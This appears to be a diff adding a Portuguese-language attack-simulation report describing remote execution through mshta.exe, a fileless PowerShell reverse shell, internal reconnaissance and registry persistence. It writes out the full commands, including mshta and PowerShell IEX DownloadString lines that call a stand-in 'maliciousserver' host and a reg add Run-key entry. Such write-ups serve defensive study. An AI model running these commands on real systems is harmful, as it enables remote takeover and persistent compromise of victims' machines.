@@ -1,0 +1,15 @@
+Durante a simulação de ataque, foi identificado um vetor de execução remota por meio do Microsoft HTML Application Host (mshta.exe). O atacante criou um script malicioso em HTML contendo comandos em JavaScript que baixavam e executavam payloads adicionais. O arquivo, nomeado como "Atualizacao_Seguranca.hta", foi distribuído por meio de um servidor web comprometido.
+
+Ao ser aberto, o arquivo executava o seguinte comando localmente:
+
+mshta.exe http://maliciousserver/payload.hta
+
+Esse payload inicial continha código ofuscado que, ao ser interpretado pelo mshta.exe, executava um script PowerShell em segundo plano:
+
+powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://maliciousserver/reverse.ps1
+')
+
+Essa cadeia de execução permitiu o carregamento de um shell reverso sem gravação em disco, dificultando a detecção por antivírus. Em seguida, o atacante utilizou o acesso para realizar reconhecimento interno, executando comandos como whoami, net localgroup administrators e ipconfig /all, mapeando usuários e interfaces de rede.
+
+A persistência foi obtida pela criação de uma entrada no registro com reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updateService /t REG_SZ /d "mshta.exe http://maliciousserver/payload.hta
+" /f, garantindo que o payload fosse reexecutado a cada logon do usuário.
